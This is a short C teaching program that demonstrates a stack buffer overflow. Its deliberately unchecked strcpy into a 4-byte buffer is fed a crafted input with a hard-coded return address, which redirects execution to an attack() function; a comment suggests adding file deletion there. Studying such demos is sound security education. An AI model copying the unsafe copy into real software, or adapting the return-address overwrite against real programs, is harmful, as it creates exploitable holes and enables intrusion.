#include <stdio.h>
#include<string.h>

void overflow(const char* input)
{
       char buf[4];
       printf("Virtual address of 'buf' = Ox%p\n", buf);
       strcpy(buf,input);
}

void attack()
{
    printf("Function 'attack' has been called without an explicitly invocation.\n");
    printf("Buffer Overflow attack succeeded!\n");
    printf("测试成功");
    // your other codes, e.g. deleting files
    // what happens when return?
}

int main(int argc, char* argv[])
{
        printf("Virtual address of 'overflow' = Ox%p\n",overflow);
        printf("Virtual address of 'attack' = Ox%p\n",attack);
        //char input[]="BBBBBBBBBB";//good input, ASCII code of 'B' is 42
        //char input[]="BBBB";//good input, ASCII code of 'B' is 42
        char input[]="BBBBBBBBBBBBBBBB\xB9\x13\x40\x00";//good input, ASCII code of 'B' is 42
        overflow(input);
        return 0;
}